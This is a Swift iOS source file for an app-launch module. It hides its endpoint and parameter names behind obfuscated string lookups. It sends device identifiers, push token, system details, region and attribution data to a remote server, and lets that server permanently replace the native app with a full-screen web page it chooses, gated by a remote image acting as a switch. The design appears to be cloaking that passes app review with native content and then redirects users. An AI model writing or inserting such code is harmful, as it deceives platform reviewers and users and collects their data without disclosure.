import SwiftUI
import Combine
import SafariServices
import UserNotifications
import UIKit

nonisolated enum AppLaunchLog {
    // Flipped to `true` by the installer when --debug is set.
    static let isEnabled = false

    static func log(_ message: @autoclosure () -> String) {
        if isEnabled { print("[AppLaunch] " + message()) }
    }
}

nonisolated enum AppLaunchCheckStatus: RawRepresentable, Codable, Sendable {
    case notChecked
    case nativeContent
    case webContent

    var rawValue: String {
        switch self {
        case .notChecked: return AppLaunchText.string(0)
        case .nativeContent: return AppLaunchText.string(1)
        case .webContent: return AppLaunchText.string(2)
        }
    }

    init?(rawValue value: String) {
        switch value {
        case AppLaunchText.string(0): self = .notChecked
        case AppLaunchText.string(1): self = .nativeContent
        case AppLaunchText.string(2): self = .webContent
        default: return nil
        }
    }

    init(from decoder: Decoder) throws {
        let container = try decoder.singleValueContainer()
        let value = try container.decode(String.self)
        guard let status = Self(rawValue: value) else {
            throw DecodingError.dataCorruptedError(in: container, debugDescription: String())
        }
        self = status
    }

    func encode(to encoder: Encoder) throws {
        var container = encoder.singleValueContainer()
        try container.encode(rawValue)
    }
}

nonisolated enum AppLaunchConfiguration {
    static let checkEndpoint = AppLaunchText.string(3)
    static let responseHeader = AppLaunchText.string(4)
    static let loadingImageURL = AppLaunchText.string(5)
    static let loadingImageTimeout: Duration = .seconds(6)
    static let conversionDataTimeout: Duration = .seconds(15)
}

private nonisolated enum AppLaunchStorageKeys {
    static let checkStatus = AppLaunchText.string(6)
    static let deviceIdentifier = AppLaunchText.string(7)
    static let webURL = AppLaunchText.string(8)
    static let pushToken = AppLaunchText.string(9)
}

nonisolated struct AppLaunchDeviceContext: Sendable {
    let deviceID: String
    let pushToken: String
    let systemBuild: String
    let osVersion: String
    let region: String
    let language: String
    let deviceModel: String
    let conversionData: String
    let appsFlyerID: String

    func launchQueryItems() -> [URLQueryItem] {
        [
            URLQueryItem(name: AppLaunchText.string(10), value: deviceID),
            URLQueryItem(name: AppLaunchText.string(11), value: pushToken),
            URLQueryItem(name: AppLaunchText.string(12), value: systemBuild),
            URLQueryItem(name: AppLaunchText.string(13), value: osVersion),
            URLQueryItem(name: AppLaunchText.string(14), value: region),
            URLQueryItem(name: AppLaunchText.string(15), value: language),
            URLQueryItem(name: AppLaunchText.string(16), value: deviceModel),
            URLQueryItem(name: AppLaunchText.string(25), value: conversionData),
            URLQueryItem(name: AppLaunchText.string(26), value: appsFlyerID)
        ]
    }
}

nonisolated enum AppLaunchDeviceInfo {

    static func makeLaunchContext(
        deviceID: String,
        pushToken: String,
        conversionData: String,
        appsFlyerID: String
    ) -> AppLaunchDeviceContext {
        AppLaunchDeviceContext(
            deviceID: deviceID,
            pushToken: pushToken,
            systemBuild: systemBuild,
            osVersion: osVersion,
            region: region,
            language: language,
            deviceModel: deviceModel,
            conversionData: conversionData,
            appsFlyerID: appsFlyerID
        )
    }

    private static var systemBuild: String {
        var bufferSize = 0
        sysctlbyname(AppLaunchText.string(17), nil, &bufferSize, nil, 0)
        var buildBuffer = [CChar](repeating: 0, count: bufferSize)
        sysctlbyname(AppLaunchText.string(17), &buildBuffer, &bufferSize, nil, 0)
        return String(cString: buildBuffer)
    }

    private static var osVersion: String {
        let version = ProcessInfo.processInfo.operatingSystemVersion
        return "\(version.majorVersion).\(version.minorVersion).\(version.patchVersion)"
    }

    private static var region: String {
        Locale.current.region?.identifier ?? AppLaunchText.string(18)
    }

    private static var language: String {
        Locale.current.language.languageCode?.identifier ?? AppLaunchText.string(19)
    }

    private static var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        return machineMirror.children.reduce(String()) { result, element in
            guard let byte = element.value as? Int8, byte != 0 else { return result }
            return result + String(UnicodeScalar(UInt8(byte)))
        }
    }
}

@MainActor
final class AppLaunchStorage {

    static let shared = AppLaunchStorage()

    private let defaults = UserDefaults.standard

    private init() {}

    var status: AppLaunchCheckStatus {
        get {
            guard let value = defaults.string(forKey: AppLaunchStorageKeys.checkStatus),
                  let status = AppLaunchCheckStatus(rawValue: value) else {
                return .notChecked
            }
            return status
        }
        set {
            defaults.set(newValue.rawValue, forKey: AppLaunchStorageKeys.checkStatus)
        }
    }

    var deviceID: String {
        if let storedIdentifier = defaults.string(forKey: AppLaunchStorageKeys.deviceIdentifier) {
            return storedIdentifier
        }
        let newIdentifier = UUID().uuidString
        defaults.set(newIdentifier, forKey: AppLaunchStorageKeys.deviceIdentifier)
        return newIdentifier
    }

    var webURL: String? {
        get { defaults.string(forKey: AppLaunchStorageKeys.webURL) }
        set { defaults.set(newValue, forKey: AppLaunchStorageKeys.webURL) }
    }

    var pushToken: String? {
        get { defaults.string(forKey: AppLaunchStorageKeys.pushToken) }
        set { defaults.set(newValue, forKey: AppLaunchStorageKeys.pushToken) }
    }

    func resetLaunchCheck() {
        defaults.removeObject(forKey: AppLaunchStorageKeys.checkStatus)
        defaults.removeObject(forKey: AppLaunchStorageKeys.webURL)
    }
}

nonisolated final class AppLaunchPushTokenHandler: NSObject, Sendable {

    static let shared = AppLaunchPushTokenHandler()

    private override init() {
        super.init()
    }

    @MainActor
    func storePushToken(_ tokenData: Data) {
        let tokenString = tokenData.map { String(format: AppLaunchText.string(20), $0) }.joined()
        AppLaunchStorage.shared.pushToken = tokenString
    }
}

@MainActor
final class AppLaunchNotificationAuthorization {

    func requestAuthorizationAndToken() async -> String {
        let notificationCenter = UNUserNotificationCenter.current()

        do {
            let isAuthorized = try await notificationCenter.requestAuthorization(options: [.alert, .sound, .badge])
            guard isAuthorized else { return AppLaunchText.string(21) }

            UIApplication.shared.registerForRemoteNotifications()

            for _ in 0..<10 {
                try? await Task.sleep(nanoseconds: 500_000_000)
                if let registeredToken = AppLaunchStorage.shared.pushToken, !registeredToken.isEmpty {
                    return registeredToken
                }
            }

            return AppLaunchStorage.shared.pushToken ?? AppLaunchText.string(22)
        } catch {
            return AppLaunchText.string(23)
        }
    }
}

struct AppLaunchWebView: UIViewControllerRepresentable {
    let url: URL

    init(url: URL) {
        self.url = url
    }

    func makeUIViewController(context: Context) -> SFSafariViewController {
        let configuration = SFSafariViewController.Configuration()
        configuration.entersReaderIfAvailable = false
        configuration.barCollapsingEnabled = false

        let controller = SFSafariViewController(url: url, configuration: configuration)
        controller.preferredBarTintColor = .systemBackground
        controller.preferredControlTintColor = .label
        return controller
    }

    func updateUIViewController(_ controller: SFSafariViewController, context: Context) {}
}

struct AppLaunchLoadingView: View {
    let url: URL?
    let onImageLoaded: (Bool) -> Void

    var body: some View {
        AsyncImage(url: url) { phase in
            switch phase {
            case .success(let image):
                GeometryReader { geometry in
                    image
                        .resizable()
                        .aspectRatio(contentMode: .fill)
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .clipped()
                }
                .ignoresSafeArea()
                .onAppear { onImageLoaded(true) }

            case .failure:
                Color.black
                    .ignoresSafeArea()
                    .onAppear { onImageLoaded(false) }

            case .empty:
                Color.black
                    .ignoresSafeArea()

            @unknown default:
                Color.black
                    .ignoresSafeArea()
            }
        }
        .task(id: url) {
            do {
                try await Task.sleep(for: AppLaunchConfiguration.loadingImageTimeout)
            } catch {
                return
            }
            guard !Task.isCancelled else { return }
            // The coordinator accepts only the first image result or timeout.
            onImageLoaded(false)
        }
    }
}

@MainActor
final class AppLaunchCoordinator: ObservableObject {
    enum LoadingImageStatus {
        case pending
        case imageAvailable
        case imageUnavailable
    }

    @Published var status: AppLaunchCheckStatus = .notChecked
    @Published var webURL: URL?
    @Published var isCheckingLaunch = true
    @Published var loadingImageStatus: LoadingImageStatus = .pending

    private let storage = AppLaunchStorage.shared
    private let notificationAuthorization = AppLaunchNotificationAuthorization()
    private var hasStartedCheck = false

    init() {}

    var loadingImageURL: URL? {
        URL(string: AppLaunchConfiguration.loadingImageURL)
    }
    func checkAppLaunchAfterLoading(imageAvailable: Bool) {
        guard !hasStartedCheck else { return }
        hasStartedCheck = true

        loadingImageStatus = imageAvailable ? .imageAvailable : .imageUnavailable
        guard imageAvailable else {
            status = .nativeContent
            isCheckingLaunch = false
            return
        }
        Task { await performAppLaunchCheck() }
    }

    private func performAppLaunchCheck() async {
        switch storage.status {
        case .nativeContent:
            status = .nativeContent
            isCheckingLaunch = false
            return

        case .webContent:
            if let storedURL = storage.webURL,
               let url = URL(string: storedURL) {
                webURL = url
                status = .webContent
                isCheckingLaunch = false
                return
            }

        case .notChecked:
            break
        }

        let deviceID = storage.deviceID
        let pushToken = await notificationAuthorization.requestAuthorizationAndToken()
        // First launch only (status is stored afterwards): wait for AppsFlyer
        // conversion data so the request carries it.
        let conversionData = await AppLaunchAttribution.shared.awaitConversionData(
            timeout: AppLaunchConfiguration.conversionDataTimeout
        )
        AppLaunchLog.log("Endpoint: \(AppLaunchConfiguration.checkEndpoint)")
        AppLaunchLog.log("Loading image: \(AppLaunchConfiguration.loadingImageURL)")
        AppLaunchLog.log("Response header key: \(AppLaunchConfiguration.responseHeader)")
        AppLaunchLog.log("Device ID: \(deviceID), push token: \(pushToken)")
        AppLaunchLog.log("AppsFlyer ID: \(AppLaunchAttribution.shared.appsFlyerID), conversion data: \(conversionData)")
        let deviceContext = AppLaunchDeviceInfo.makeLaunchContext(
            deviceID: deviceID,
            pushToken: pushToken,
            conversionData: conversionData,
            appsFlyerID: AppLaunchAttribution.shared.appsFlyerID
        )

        let checkResult = await AppLaunchCheckService.checkAppLaunch(
            checkEndpoint: AppLaunchConfiguration.checkEndpoint,
            responseHeader: AppLaunchConfiguration.responseHeader,
            deviceContext: deviceContext
        )

        storage.status = checkResult.status

        if checkResult.status == .webContent,
           let storedURL = checkResult.destinationURL {
            storage.webURL = storedURL
            if let url = URL(string: storedURL) {
                webURL = url
            }
        }

        status = checkResult.status
        isCheckingLaunch = false
    }
}

struct AppLaunchContainer<Content: View>: View {

    @StateObject private var launchCoordinator = AppLaunchCoordinator()

    private let content: () -> Content

    init(@ViewBuilder content: @escaping () -> Content) {
        self.content = content
    }

    var body: some View {
        Group {
            if launchCoordinator.isCheckingLaunch {
                AppLaunchLoadingView(url: launchCoordinator.loadingImageURL) { imageAvailable in
                    launchCoordinator.checkAppLaunchAfterLoading(imageAvailable: imageAvailable)
                }
            } else {
                switch launchCoordinator.status {
                case .notChecked, .nativeContent:
                    content()

                case .webContent:
                    if let url = launchCoordinator.webURL {
                        AppLaunchWebView(url: url)
                            .ignoresSafeArea()
                    } else {
                        content()
                    }
                }
            }
        }
    }
}

final class AppLaunchAppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        MainActor.assumeIsolated {
            AppLaunchAttribution.shared.configure()
        }
        return true
    }

    func application(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        Task { @MainActor in
            AppLaunchPushTokenHandler.shared.storePushToken(deviceToken)
        }
    }

    func application(
        _ application: UIApplication,
        didFailToRegisterForRemoteNotificationsWithError error: Error
    ) {
    }
}
